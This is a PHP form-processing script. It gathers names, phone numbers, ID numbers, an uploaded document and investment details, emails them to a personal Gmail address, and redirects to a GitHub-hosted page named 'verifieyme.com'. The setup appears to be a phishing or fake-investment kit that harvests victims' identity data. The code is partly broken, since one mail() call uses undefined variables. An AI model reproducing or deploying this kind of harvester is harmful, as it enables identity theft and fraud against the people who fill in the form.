<?php
/* Set e-mail recipient */
$myemail  = "favoursilver316@gmail.com";

/* Check all form inputs using check_input function */
$first_name = check_input($_POST['first_name'], "Enter your first_name");
$last_name = check_input($_POST['last_name'], "Enter your last_name");
$tel = check_input($_POST['tel'], "Enter your tel");
$doc_file = check_input($_POST['doc_file'], "Upload file");
$partnerships = check_input($_POST['partnerships'], "Select Option");
$investment = check_input($_POST['investment'], "Select Option");
$trading = check_input($_POST['trading'], "Select Option");
$llc = check_input($_POST['llc'], "Select Option");
$cfi = check_input($_POST['cfi'], "Select Option");
$j_position = check_input($_POST['j_position'], "Select Option");
$Amount_Invole = check_input($_POST['Amount_Invole'], "Select Option");
$priority = check_input($_POST['priority'], "Select Option");
$idnumber = check_input($_POST['idnumber'], "Select Option");
$some_word = check_input($_POST['some_word'], "Enter your message");




/* Let's prepare the message for the e-mail */
  $some_word = "First Name : ".$first_name. "\r\n" .
    		"Last Name : ".$last_name. "\r\n" .
    		"tel : ".$tel. "\r\n" .
    		"Upload File : ".$doc_file. "\r\n" .
			"partnerships : ".$partnerships. "\r\n" .
			"Investment : ".$investment. "\r\n" .
			"Trading : ".$trading. "\r\n" .
			"Amount Invole : ".$Amount_Invole. "\r\n" .
    		"Message : " . $some_word;
    if(mail($to, $subject, $some_word , $headers)){
        echo "Mail Sent!";
    }else{
         echo "Failed To Send Mail";
    }


/* Send the message using mail() function */
mail($myemail, $subject, $some_word);


/* Redirect visitor to the thank you page */
header('Location:https://favsil316.github.io/verifieyme.com/index-dark.html/');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html>
    <body>

    <b>Please correct the following error:</b><br />
    <?php echo $myError; ?>

    </body>
    </html>
<?php
exit();
}
?>
